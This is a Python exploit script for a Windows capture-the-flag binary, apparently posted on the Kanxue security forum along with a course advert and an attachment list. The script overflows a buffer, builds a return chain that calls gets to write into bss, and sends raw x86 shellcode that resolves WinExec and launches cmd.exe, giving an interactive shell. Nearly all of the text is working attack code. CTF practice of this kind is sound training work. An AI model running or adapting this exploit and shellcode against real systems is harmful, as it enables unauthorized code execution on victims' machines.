
```python
from winpwn import *
import os
import traceback
import sys
import socket

context.log_level = 'debug'
context.arch = 'amd64'
context.arch = 'i386'

def get_sh():
    if len(sys.argv) > 1 and sys.argv[1] == 'REMOTE':
        return remote(sys.argv[2], sys.argv[3])
    else:
        return process(r"C:\Users\origi\Desktop\chall.exe")

def get_gdb(sh, stop=False):
    x64dbg.attach(sh)

def Attack(sh=None, ip=None, port=None):
    if ip != None and port != None:
        try:
            sh = remote(ip, port)
        except:
            return 'ERROR : Can not connect to target server!'
    try:
        sh.recvuntil('Enter your name:')
        bss = 0x405040
        payload = 'a' * 28
        payload += p32(0) # ebp
        payload += p32(0x40263C) # gets
        payload += p32(bss)
        payload += p32(bss)

        #get_gdb(sh)
        sh.sendline(payload)

        shellcode = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x40\x1c\x8b\x04\x08\x8b\x04\x08\x8b\x58\x08\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x49\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd6\x31\xc9\x51\x68\x45\x78\x65\x63\x68\x41\x57\x69\x6e\x89\xe1\x8d\x49\x01\x51\x53\xff\xd6\x87\xfa\x89\xc7\x31\xc9\x51\x68\x72\x65\x61\x64\x68\x69\x74\x54\x68\x68\x41\x41\x45\x78\x89\xe1\x8d\x49\x02\x51\x53\xff\xd6\x89\xc6\x31\xc9\x51\x68\x65\x78\x65\x20\x68\x63\x6d\x64\x2e\x89\xe1\x6a\x01\x51\xff\xd7\x31\xc9\x51\xff\xd6"
        sh.sendline(shellcode)
        sh.interactive()

    except Exception as e:
        traceback.print_exc()
        sh.close()
        return 'ERROR : Runtime error!'

if __name__ == "__main__":
    sh = get_sh()
    Attack(sh=sh)
```

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于 2023-4-10 19:51 被X1ng编辑，原因：[#题解集锦](https://bbs.kanxue.com/forum-171-1-187.htm)

上传的附件：

- [golden-banana.tar.gz](javascript:void(0);)（8.12kb，10次下载）
- [scm.zip](javascript:void(0);)（865.20kb，11次下载）
- [chall.exe](javascript:void(0);)（11.50kb，9次下载）
